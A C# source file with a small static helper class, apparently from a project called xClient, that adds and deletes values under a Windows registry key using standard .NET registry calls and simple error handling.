using System;
using Microsoft.Win32;
using xClient.Core.Extensions;

namespace xClient.Core.Helper
{
    public static class RegistryKeyHelper
    {
        /// <summary>
        /// Adds a value to the registry key.
        /// </summary>
        /// <param name="baseKey">The base key.</param>
        /// <param name="path">The path to the registry key.</param>
        /// <param name="name">The name of the value.</param>
        /// <param name="value">The value.</param>
        /// <param name="addQuotes">If set to True, adds quotes to the value.</param>
        /// <returns>True on success, else False.</returns>
        public static bool AddRegistryKeyValue(RegistryKey baseKey, string path, string name, string value, bool addQuotes = false)
        {
            try
            {
                if (addQuotes && !value.StartsWith("\"") && !value.EndsWith("\""))
                    value = "\"" + value + "\"";
                using (RegistryKey key = baseKey.OpenWritableSubKeySafe(path))
                {
                    if (key == null) return false;
                    key.SetValue(name, value);
                    return true;
                }
            }
            catch (Exception)
            {
                return false;
            }
        }

        /// <summary>
        /// Deletes the specified value from the registry key.
        /// </summary>
        /// <param name="baseKey">THe base key.</param>
        /// <param name="path">The path to the registry key.</param>
        /// <param name="name">The name of the value to delete.</param>
        /// <returns>True on success, else False.</returns>
        public static bool DeleteRegistryKeyValue(RegistryKey baseKey, string path, string name)
        {
            try
            {
                using (RegistryKey key = baseKey.OpenWritableSubKeySafe(path))
                {
                    if (key == null) return false;
                    key.DeleteValue(name, true);
                    return true;
                }
            }
            catch (Exception)
            {
                return false;
            }
        }
    }
}
